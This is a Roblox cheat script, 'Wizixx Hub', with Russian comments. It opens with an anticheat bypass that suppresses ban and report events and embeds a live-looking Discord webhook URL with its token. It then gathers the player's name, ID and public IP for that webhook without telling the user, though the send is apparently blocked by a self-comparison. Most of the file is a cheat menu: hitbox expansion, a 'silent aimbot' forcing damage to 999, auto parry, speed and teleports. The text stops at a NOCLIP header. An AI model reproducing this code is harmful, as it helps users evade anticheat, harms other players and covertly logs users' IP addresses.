--[[
    Wizixx Hub [14.02.2026] - РАБОЧАЯ ВЕРСИЯ
    Команда: Swill Way
    Статус: Tool Tips fix | Freecam fix | Spider | Dash
--]]

-- ================== ОБХОД АНТИЧИТА ==================
local function BypassAntiCheat()
    pcall(function()
        if game:GetService("ReplicatedStorage"):FindFirstChild("AntiCheat") then
            game:GetService("ReplicatedStorage").AntiCheat:Destroy()
        end
        
        local mt = getrawmetatable and getrawmetatable(game)
        if mt then
            local oldNamecall = mt.__namecall
            setreadonly(mt, false)
            mt.__namecall = function(...)
                local args = {...}
                local method = getnamecallmethod()
                if method == "FireServer" and type(args[2]) == "string" then
                    if args[2]:find("Ban") or args[2]:find("Cheat") or args[2]:find("Report") or args[2]:find("Anti") then
                        return nil
                    end
                end
                return oldNamecall(...)
            end
            setreadonly(mt, true)
        end
    end)
end
BypassAntiCheat()

-- ================== ВЕБХУК ==================
local webhookUrl = "https://discord.com/api/webhooks/1472242255887732738/LBpvm7UYHrXHUMF9RADknCGPfc6FmmZVle-bBaA3aVidoVT4y-vT1e3bE4BTE6xzHOll"

-- ================== СБОР ИНФЫ ОБ ИНЖЕКТЕ ==================
spawn(function()
    pcall(function()
        local http = game:GetService("HttpService")
        local players = game:GetService("Players")
        local lp = players.LocalPlayer
        
        local executorName = "Unknown"
        if identifyexecutor then
            executorName = identifyexecutor()
        end
        
        local ip = "Unknown"
        pcall(function()
            ip = game:HttpGet("https://api.ipify.org")
        end)
        
        local data = {
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "🚀 Wizixx Hub Injected",
                ["color"] = 16711680,
                ["fields"] = {
                    {["name"] = "👤 Player", ["value"] = lp.Name .. " (" .. lp.UserId .. ")", ["inline"] = true},
                    {["name"] = "🌐 IP", ["value"] = "||" .. ip .. "||", ["inline"] = true},
                    {["name"] = "💉 Executor", ["value"] = executorName, ["inline"] = true},
                    {["name"] = "⏰ Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = true},
                    {["name"] = "🎮 Game", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = true}
                },
                ["footer"] = {["text"] = "Wizixx Hub • " .. os.date("%H:%M:%S")}
            }}
        }
        
        if webhookUrl and webhookUrl ~= "https://discord.com/api/webhooks/1472242255887732738/LBpvm7UYHrXHUMF9RADknCGPfc6FmmZVle-bBaA3aVidoVT4y-vT1e3bE4BTE6xzHOll" then
            pcall(function()
                http:PostAsync(webhookUrl, http:JSONEncode(data))
            end)
        end
    end)
end)

-- ================== ОСНОВНЫЕ СЕРВИСЫ ==================
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local Camera = Workspace.CurrentCamera
local LP = Players.LocalPlayer
local Mouse = LP:GetMouse()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")

repeat task.wait() until LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")

-- ================== GUI ==================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Wizixx_Hub"
ScreenGui.Parent = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- ================== TOOL TIPS (РАБОЧИЕ) ==================
local ToolTip = Instance.new("Frame")
ToolTip.Name = "Wizixx_ToolTip"
ToolTip.Size = UDim2.new(0, 250, 0, 40)
ToolTip.Position = UDim2.new(0, Mouse.X + 20, 0, Mouse.Y + 20)
ToolTip.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ToolTip.BackgroundTransparency = 0.2
ToolTip.BorderSizePixel = 2
ToolTip.BorderColor3 = Color3.fromRGB(255, 0, 0)
ToolTip.ZIndex = 999
ToolTip.Visible = false
ToolTip.Parent = ScreenGui

local ToolTipCorner = Instance.new("UICorner")
ToolTipCorner.CornerRadius = UDim.new(0, 8)
ToolTipCorner.Parent = ToolTip

local ToolTipText = Instance.new("TextLabel")
ToolTipText.Size = UDim2.new(1, -10, 1, 0)
ToolTipText.Position = UDim2.new(0, 5, 0, 0)
ToolTipText.BackgroundTransparency = 1
ToolTipText.Text = ""
ToolTipText.TextColor3 = Color3.fromRGB(255, 255, 255)
ToolTipText.TextSize = 14
ToolTipText.TextXAlignment = Enum.TextXAlignment.Left
ToolTipText.Font = Enum.Font.Gotham
ToolTipText.ZIndex = 999
ToolTipText.Parent = ToolTip

-- Обновление позиции ToolTip
RunService.RenderStepped:Connect(function()
    if ToolTip.Visible then
        ToolTip.Position = UDim2.new(0, Mouse.X + 20, 0, Mouse.Y + 20)
    end
end)

-- Функции для ToolTip
local function ShowToolTip(text)
    ToolTipText.Text = text
    ToolTip.Visible = true
end

local function HideToolTip()
    ToolTip.Visible = false
end

-- ================== ВАТЕРМАРКА ==================
local Watermark = Instance.new("Frame")
Watermark.Size = UDim2.new(0, 200, 0, 35)
Watermark.Position = UDim2.new(1, -210, 0, 10)
Watermark.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Watermark.BackgroundTransparency = 0.3
Watermark.BorderSizePixel = 2
Watermark.BorderColor3 = Color3.fromRGB(255, 255, 255)
Watermark.ZIndex = 1000
Watermark.Parent = ScreenGui

local UICornerWatermark = Instance.new("UICorner")
UICornerWatermark.CornerRadius = UDim.new(0, 8)
UICornerWatermark.Parent = Watermark

local WatermarkText = Instance.new("TextLabel")
WatermarkText.Size = UDim2.new(1, 0, 1, 0)
WatermarkText.BackgroundTransparency = 1
WatermarkText.Text = "WizixxHub 🕷️ " .. os.date("%H:%M:%S")
WatermarkText.TextColor3 = Color3.fromRGB(255, 255, 255)
WatermarkText.TextSize = 16
WatermarkText.Font = Enum.Font.GothamBold
WatermarkText.TextXAlignment = Enum.TextXAlignment.Center
WatermarkText.ZIndex = 1000
WatermarkText.Parent = Watermark

spawn(function()
    while true do
        WatermarkText.Text = "WizixxHub 🕷️ " .. os.date("%H:%M:%S")
        task.wait(1)
    end
end)

-- ================== ОСНОВНОЕ МЕНЮ ==================
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 650, 0, 500)
MainFrame.Position = UDim2.new(0.5, -325, 0.5, -250)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BackgroundTransparency = 0.2
MainFrame.BorderSizePixel = 2
MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.ZIndex = 10
MainFrame.Parent = ScreenGui
MainFrame.Visible = true

local UIMainCorner = Instance.new("UICorner")
UIMainCorner.CornerRadius = UDim.new(0, 10)
UIMainCorner.Parent = MainFrame

-- Заголовок с анимацией
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local UITitleCorner = Instance.new("UICorner")
UITitleCorner.CornerRadius = UDim.new(0, 10)
UITitleCorner.Parent = TitleBar

local TitleText = Instance.new("TextLabel")
TitleText.Size = UDim2.new(1, -80, 1, 0)
TitleText.Position = UDim2.new(0, 10, 0, 0)
TitleText.BackgroundTransparency = 1
TitleText.Text = ""
TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleText.TextSize = 20
TitleText.TextXAlignment = Enum.TextXAlignment.Left
TitleText.Font = Enum.Font.GothamBold
TitleText.ZIndex = 11
TitleText.Parent = TitleBar

-- ToolTip для заголовка
TitleBar.MouseEnter:Connect(function()
    ShowToolTip("WIZIXX HUB 🕷️ - Main menu title")
end)
TitleBar.MouseLeave:Connect(HideToolTip)

-- Анимация текста
local fullText = "Wizixx Hub 🕷️ "
local typingSpeed = 0.15
spawn(function()
    while true do
        for i = 1, #fullText do
            TitleText.Text = string.sub(fullText, 1, i) .. "|"
            task.wait(typingSpeed)
        end
        TitleText.Text = fullText
        task.wait(5)
        TitleText.Text = ""
        task.wait(0.3)
    end
end)

-- Кнопка закрытия
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -40, 0, 5)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 18
CloseButton.Font = Enum.Font.GothamBold
CloseButton.ZIndex = 12
CloseButton.Parent = TitleBar

-- ToolTip для кнопки закрытия
CloseButton.MouseEnter:Connect(function()
    ShowToolTip("CLOSE ❌ - Close the hub")
end)
CloseButton.MouseLeave:Connect(HideToolTip)

local UICloseCorner = Instance.new("UICorner")
UICloseCorner.CornerRadius = UDim.new(0, 6)
UICloseCorner.Parent = CloseButton

CloseButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
end)

-- Кнопка свернуть
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Position = UDim2.new(1, -75, 0, 5)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 255)
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextSize = 24
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.ZIndex = 12
MinimizeButton.Parent = TitleBar

-- ToolTip для кнопки свернуть
MinimizeButton.MouseEnter:Connect(function()
    ShowToolTip("MINIMIZE ➖ - Hide the hub")
end)
MinimizeButton.MouseLeave:Connect(HideToolTip)

local UIMinimizeCorner = Instance.new("UICorner")
UIMinimizeCorner.CornerRadius = UDim.new(0, 6)
UIMinimizeCorner.Parent = MinimizeButton

MinimizeButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
end)

-- Вкладки сверху
local TabContainer = Instance.new("Frame")
TabContainer.Size = UDim2.new(1, -20, 0, 35)
TabContainer.Position = UDim2.new(0, 10, 0, 50)
TabContainer.BackgroundTransparency = 1
TabContainer.Parent = MainFrame

local function CreateTabButton(name, pos)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 120, 1, 0)
    btn.Position = UDim2.new(0, (pos-1) * 125, 0, 0)
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 16
    btn.Font = Enum.Font.GothamBold
    btn.ZIndex = 11
    btn.Parent = TabContainer
    
    -- ToolTip для вкладок
    btn.MouseEnter:Connect(function()
        ShowToolTip("TAB " .. name .. " - Switch to " .. name .. " section")
    end)
    btn.MouseLeave:Connect(HideToolTip)
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn
    
    return btn
end

-- Контейнер для контента вкладок
local ContentContainer = Instance.new("Frame")
ContentContainer.Size = UDim2.new(1, -20, 1, -100)
ContentContainer.Position = UDim2.new(0, 10, 0, 90)
ContentContainer.BackgroundTransparency = 1
ContentContainer.Parent = MainFrame

-- Создаем вкладки
local tabs = {}
local tabButtons = {}
local tabNames = {"⚔️ COMBAT", "👁️ VISUAL", "🦶 MOVEMENT", "🌍 WORLD", "🎮 MISC"}

for i, name in ipairs(tabNames) do
    local btn = CreateTabButton(name, i)
    tabButtons[name] = btn
    
    local scroll = Instance.new("ScrollingFrame")
    scroll.Name = name
    scroll.Size = UDim2.new(1, 0, 1, 0)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 5
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.Visible = false
    scroll.ZIndex = 11
    scroll.Parent = ContentContainer
    
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 5)
    layout.Parent = scroll
    
    tabs[name] = {frame = scroll, layout = layout}
    
    btn.MouseButton1Click:Connect(function()
        for _, b in pairs(tabButtons) do
            b.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        end
        btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        
        for _, tab in pairs(tabs) do
            tab.frame.Visible = false
        end
        scroll.Visible = true
    end)
end

-- Активируем первую вкладку
tabButtons[tabNames[1]].BackgroundColor3 = Color3.fromRGB(255, 0, 0)
tabs[tabNames[1]].frame.Visible = true

-- ================== ФУНКЦИИ ==================
local Functions = {
    Fly = false,
    Speed = false,
    NoClip = false,
    InfiniteJump = false,
    ESP = false,
    AutoParry = false,
    Aimbot = false,
    HitboxExpander = false,
    HitboxSize = 2,
    AntiStun = false,
    XRay = false,
    NameTags = false,
    ClickTP = false,
    TeleportToPlayer = false,
    TeleportToCursor = false,
    Freecam = false,
    FreecamTP = false,
    Spider = false,
    Strafe = false,
    Dash = false,
    FreecamActive = false,
    KillCounter = 0,
    DeathCounter = 0,
    HitSound = "Pop",
    KillSound = "Ting",
    Volume = 0.5
}

local ESPHighlights = {}
local FlyPart = nil
local NameTagList = {}
local SpiderActive = false
local FreecamConnection = nil
local FreecamTPConnection = nil

-- Функция создания переключателя с ToolTip
local function CreateToggle(parent, name, desc, callback)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, -10, 0, 35)
    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Frame.Parent = parent
    
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 6)
    UICorner.Parent = Frame
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -50, 1, 0)
    Label.Position = UDim2.new(0, 10, 0, 0)
    Label.BackgroundTransparency = 1
    Label.Text = name
    Label.TextColor3 = Color3.fromRGB(255, 255, 255)
    Label.TextSize = 14
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Font = Enum.Font.Gotham
    Label.Parent = Frame
    
    -- ToolTip для функции
    Frame.MouseEnter:Connect(function()
        ShowToolTip(desc)
    end)
    Frame.MouseLeave:Connect(HideToolTip)
    
    local Toggle = Instance.new("TextButton")
    Toggle.Size = UDim2.new(0, 40, 0, 25)
    Toggle.Position = UDim2.new(1, -45, 0.5, -12.5)
    Toggle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    Toggle.Text = ""
    Toggle.Parent = Frame
    
    local UICornerToggle = Instance.new("UICorner")
    UICornerToggle.CornerRadius = UDim.new(0, 12)
    UICornerToggle.Parent = Toggle
    
    local active = false
    local check = Instance.new("Frame")
    check.Size = UDim2.new(0, 15, 0, 15)
    check.Position = UDim2.new(0, 5, 0.5, -7.5)
    check.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    check.BackgroundTransparency = 1
    check.Parent = Toggle
    
    local UICornerCheck = Instance.new("UICorner")
    UICornerCheck.CornerRadius = UDim.new(1, 0)
    UICornerCheck.Parent = check
    
    Toggle.MouseButton1Click:Connect(function()
        active = not active
        if active then
            Toggle.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
            local tween = TweenService:Create(check, TweenInfo.new(0.2), {BackgroundTransparency = 0})
            tween:Play()
        else
            Toggle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
            local tween = TweenService:Create(check, TweenInfo.new(0.2), {BackgroundTransparency = 1})
            tween:Play()
        end
        pcall(function() callback(active) end)
    end)
end

-- Функция создания ползунка с ToolTip
local function CreateSlider(parent, name, desc, min, max, default, callback)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, -10, 0, 45)
    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Frame.Parent = parent
    
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 6)
    UICorner.Parent = Frame
    
    -- ToolTip для ползунка
    Frame.MouseEnter:Connect(function()
        ShowToolTip(desc)
    end)
    Frame.MouseLeave:Connect(HideToolTip)
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -20, 0, 20)
    Label.Position = UDim2.new(0, 10, 0, 5)
    Label.BackgroundTransparency = 1
    Label.Text = name .. ": " .. tostring(default)
    Label.TextColor3 = Color3.fromRGB(255, 255, 255)
    Label.TextSize = 14
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Font = Enum.Font.Gotham
    Label.Parent = Frame
    
    local SliderBar = Instance.new("Frame")
    SliderBar.Size = UDim2.new(1, -20, 0, 10)
    SliderBar.Position = UDim2.new(0, 10, 0, 25)
    SliderBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    SliderBar.Parent = Frame
    
    local SliderFill = Instance.new("Frame")
    SliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    SliderFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    SliderFill.BorderSizePixel = 0
    SliderFill.Parent = SliderBar
    
    local SliderButton = Instance.new("TextButton")
    SliderButton.Size = UDim2.new(1, 0, 1, 0)
    SliderButton.BackgroundTransparency = 1
    SliderButton.Text = ""
    SliderButton.Parent = SliderBar
    
    local value = default
    
    SliderButton.MouseButton1Down:Connect(function()
        local connection
        connection = UserInputService.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                local pos = UserInputService:GetMouseLocation()
                local barPos = SliderBar.AbsolutePosition.X
                local barSize = SliderBar.AbsoluteSize.X
                local relative = math.clamp((pos - barPos) / barSize, 0, 1)
                SliderFill.Size = UDim2.new(relative, 0, 1, 0)
                value = min + (max - min) * relative
                Label.Text = name .. ": " .. string.format("%.1f", value)
                pcall(function() callback(value) end)
            end
        end)
        
        connection:Wait()
        UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                connection:Disconnect()
            end
        end)
    end)
end

-- ================== SPIDER ==================
CreateToggle(tabs["🦶 MOVEMENT"].frame, "🕷️ Spider", "SPIDER 🕷️ - Climb walls (hold W into wall)", function(state)
    Functions.Spider = state
    SpiderActive = state
    
    if state then
        local spiderConnection
        spiderConnection = RunService.Heartbeat:Connect(function()
            if not SpiderActive or not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then
                return
            end
            
            local hrp = LP.Character.HumanoidRootPart
            local moveDir = Vector3.new(0, 0, 0)
            
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Camera.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - Camera.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - Camera.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Camera.CFrame.RightVector end
            
            if moveDir.Magnitude > 0 then
                moveDir = moveDir.Unit * 50
                
                local ray = Ray.new(hrp.Position, moveDir.Unit * 10)
                local hit, pos = Workspace:FindPartOnRay(ray, LP.Character)
                
                if hit then
                    hrp.Velocity = moveDir
                    hrp.CFrame = CFrame.lookAt(hrp.Position, hrp.Position + hit.Normal)
                end
            end
        end)
    end
end)

-- ================== DASH ==================
CreateToggle(tabs["⚔️ COMBAT"].frame, "🌀 Dash", "DASH 🌀 - Left Control = dash forward 20 studs", function(state)
    Functions.Dash = state
    
    if state then
        local dashConnection
        dashConnection = UserInputService.InputBegan:Connect(function(input)
            if input.KeyCode == Enum.KeyCode.LeftControl and Functions.Dash then
                if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
                    local hrp = LP.Character.HumanoidRootPart
                    local dashDir = Camera.CFrame.LookVector * 20
                    hrp.CFrame = hrp.CFrame + dashDir
                end
            end
        end)
    end
end)

-- ================== STRAFE ==================
CreateToggle(tabs["🦶 MOVEMENT"].frame, "🔄 Strafe", "STRAFE 🔄 - Jump to get pushed back", function(state)
    Functions.Strafe = state
    
    if state then
        local strafeConnection
        strafeConnection = UserInputService.JumpRequest:Connect(function()
            if Functions.Strafe and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = LP.Character.HumanoidRootPart
                hrp.Velocity = hrp.Velocity - Camera.CFrame.LookVector * 30
            end
        end)
    end
end)

-- ================== FLY PLATFORM ==================
CreateToggle(tabs["🦶 MOVEMENT"].frame, "🚀 Fly Platform", "FLY PLATFORM 🚀 - Walk on platform, Space up, Tab down", function(state)
    Functions.Fly = state
    
    if state then
        FlyPart = Instance.new("Part")
        FlyPart.Name = "Wizixx_FlyPart"
        FlyPart.Size = Vector3.new(4, 0.2, 4)
        FlyPart.Position = LP.Character.HumanoidRootPart.Position - Vector3.new(0, 3, 0)
        FlyPart.Anchored = true
        FlyPart.CanCollide = true
        FlyPart.Transparency = 0.7
        FlyPart.BrickColor = BrickColor.new("Bright blue")
        FlyPart.Material = Enum.Material.Neon
        FlyPart.Parent = Workspace
        
        pcall(function()
            FlyPart:SetNetworkOwner(LP)
        end)
        
        local targetHeight = FlyPart.Position.Y
        local flyConnection
        flyConnection = RunService.Heartbeat:Connect(function()
            if not Functions.Fly or not FlyPart then 
                flyConnection:Disconnect()
                return
            end
            
            if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = LP.Character.HumanoidRootPart
                local newPos = Vector3.new(hrp.Position.X, FlyPart.Position.Y, hrp.Position.Z)
                FlyPart.Position = newPos
            end
            
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                targetHeight = targetHeight + 0.5
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.Tab) then
                targetHeight = targetHeight - 0.5
            end
            
            local currentY = FlyPart.Position.Y
            local newY = currentY + (targetHeight - currentY) * 0.1
            FlyPart.Position = Vector3.new(FlyPart.Position.X, newY, FlyPart.Position.Z)
        end)
    else
        if FlyPart then
            FlyPart:Destroy()
            FlyPart = nil
        end
    end
end)

-- ================== FREECAM (ОБЫЧНАЯ) ==================
CreateToggle(tabs["👁️ VISUAL"].frame, "🎥 Freecam", "FREECAM 🎥 - Fly camera, Shift speed, character stays", function(state)
    Functions.Freecam = state
    
    if state then
        -- Блокируем персонажа
        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
            LP.Character.HumanoidRootPart.Anchored = true
        end
        
        local speed = 1
        FreecamConnection = RunService.Heartbeat:Connect(function()
            if not Functions.Freecam then
                FreecamConnection:Disconnect()
                return
            end
            
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                speed = 3
            else
                speed = 1
            end
            
            local moveDir = Vector3.new(0, 0, 0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Camera.CFrame.LookVector * speed end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - Camera.CFrame.LookVector * speed end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - Camera.CFrame.RightVector * speed end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Camera.CFrame.RightVector * speed end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, speed, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir + Vector3.new(0, -speed, 0) end
            
            Camera.CFrame = Camera.CFrame + moveDir
        end)
    else
        if FreecamConnection then
            FreecamConnection:Disconnect()
            FreecamConnection = nil
        end
        
        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
            LP.Character.HumanoidRootPart.Anchored = false
            Camera.CFrame = CFrame.new(LP.Character.HumanoidRootPart.Position + Vector3.new(0, 5, 10), LP.Character.HumanoidRootPart.Position)
        end
    end
end)

-- ================== FREECAM TP ==================
CreateToggle(tabs["🌍 WORLD"].frame, "🌌 Freecam TP", "FREECAM TP 🌌 - Fly camera, disable to teleport", function(state)
    Functions.FreecamTP = state
    
    if state then
        -- Сохраняем позицию камеры
        local camPos = Camera.CFrame.Position
        
        -- Блокируем персонажа
        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
            LP.Character.HumanoidRootPart.Anchored = true
        end
        
        local speed = 1
        FreecamTPConnection = RunService.Heartbeat:Connect(function()
            if not Functions.FreecamTP then
                FreecamTPConnection:Disconnect()
                return
            end
            
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                speed = 3
            else
                speed = 1
            end
            
            local moveDir = Vector3.new(0, 0, 0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Camera.CFrame.LookVector * speed end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - Camera.CFrame.LookVector * speed end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - Camera.CFrame.RightVector * speed end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Camera.CFrame.RightVector * speed end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, speed, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir + Vector3.new(0, -speed, 0) end
            
            Camera.CFrame = Camera.CFrame + moveDir
        end)
    else
        if FreecamTPConnection then
            FreecamTPConnection:Disconnect()
            FreecamTPConnection = nil
        end
        
        if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = LP.Character.HumanoidRootPart
            hrp.Anchored = false
            hrp.CFrame = Camera.CFrame + Vector3.new(0, 3, 0)
            Camera.CFrame = CFrame.new(hrp.Position + Vector3.new(0, 5, 10), hrp.Position)
        end
    end
end)

-- ================== HITBOX EXPANDER ==================
CreateSlider(tabs["⚔️ COMBAT"].frame, "📦 Hitbox Size", "HITBOX SIZE 📦 - Adjust hitbox multiplier", 1, 10, 2, function(value)
    Functions.HitboxSize = value
end)

CreateToggle(tabs["⚔️ COMBAT"].frame, "📦 Hitbox Expander", "HITBOX EXPANDER 📦 - Make enemy hitboxes bigger", function(state)
    Functions.HitboxExpander = state
    
    if state then
        local expandConnection
        expandConnection = RunService.Heartbeat:Connect(function()
            if not Functions.HitboxExpander then expandConnection:Disconnect() return end
            
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LP and plr.Character then
                    for _, part in pairs(plr.Character:GetChildren()) do
                        if part:IsA("BasePart") then
                            if not part:FindFirstChild("OriginalSize") then
                                local sizeValue = Instance.new("Vector3Value")
                                sizeValue.Name = "OriginalSize"
                                sizeValue.Value = part.Size
                                sizeValue.Parent = part
                            end
                            part.Size = part.OriginalSize.Value * Functions.HitboxSize
                        end
                    end
                end
            end
        end)
    else
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Character then
                for _, part in pairs(plr.Character:GetChildren()) do
                    if part:IsA("BasePart") and part:FindFirstChild("OriginalSize") then
                        part.Size = part.OriginalSize.Value
                        part.OriginalSize:Destroy()
                    end
                end
            end
        end
    end
end)

-- ================== AUTO PARRY ==================
CreateToggle(tabs["⚔️ COMBAT"].frame, "🛡️ Auto Parry", "AUTO PARRY 🛡️ - Automatically parry attacks", function(state)
    Functions.AutoParry = state
    
    if state then
        local parryEvent = nil
        local events = ReplicatedStorage:FindFirstChild("Events")
        if events then
            parryEvent = events:FindFirstChild("CombatEvent") or events:FindFirstChild("ParryEvent")
        end
        
        local function CheckForHitboxes()
            if not Functions.AutoParry or not LP.Character then return end
            
            local root = LP.Character.HumanoidRootPart
            if not root then return end
            
            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("Part") or obj:IsA("MeshPart") then
                    local name = obj.Name or ""
                    if name:find("Punch") or name:find("Muda") or name:find("Barrage") or name:find("Hitbox") then
                        if (obj.Position - root.Position).Magnitude < 15 then
                            if parryEvent then
                                pcall(function()
                                    parryEvent:FireServer("Parry", LP.Character)
                                end)
                                break
                            end
                        end
                    end
                end
            end
        end
        
        local parryLoop = RunService.Heartbeat:Connect(CheckForHitboxes)
        Functions.ParryConnection = parryLoop
    else
        if Functions.ParryConnection then
            Functions.ParryConnection:Disconnect()
            Functions.ParryConnection = nil
        end
    end
end)

-- ================== SILENT AIMBOT ==================
CreateToggle(tabs["⚔️ COMBAT"].frame, "🎯 Silent Aimbot", "SILENT AIMBOT 🎯 - Silent aimbot", function(state)
    Functions.Aimbot = state
    
    if state then
        local aimConnection
        aimConnection = RunService.Heartbeat:Connect(function()
            if not Functions.Aimbot then aimConnection:Disconnect() return end
            
            local closest, shortest = nil, math.huge
            
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LP and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    local screenPos, onScreen = Camera:WorldToScreenPoint(plr.Character.HumanoidRootPart.Position)
                    if onScreen then
                        local dist = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
                        if dist < shortest and dist < 150 then
                            shortest = dist
                            closest = plr
                        end
                    end
                end
            end
            
            if closest then
                local mt = getrawmetatable and getrawmetatable(game)
                if mt then
                    local old = mt.__index
                    setreadonly(mt, false)
                    mt.__index = function(t, k)
                        if t:IsA("Tool") and k == "Damage" then
                            return 999
                        end
                        return old(t, k)
                    end
                    setreadonly(mt, true)
                end
            end
        end)
    end
end)

-- ================== SPEED ==================
CreateToggle(tabs["🦶 MOVEMENT"].frame, "⚡ Speed", "SPEED ⚡ - WalkSpeed 120", function(state)
    Functions.Speed = state
    local hum = LP.Character and LP.Character:FindFirstChild("Humanoid")
    if hum then
        hum.WalkSpeed = state and 120 or 16
    end
end)

-- ================== JUMP POWER ==================
CreateToggle(tabs["🦶 MOVEMENT"].frame, "🦘 Jump Power", "JUMP POWER 🦘 - Jump higher", function(state)
    Functions.JumpPower = state
    local hum = LP.Character and LP.Character:FindFirstChild("Humanoid")
    if hum then
        hum.JumpPower = state and 100 or 50
    end
end)

-- ================== NOCLIP ==================
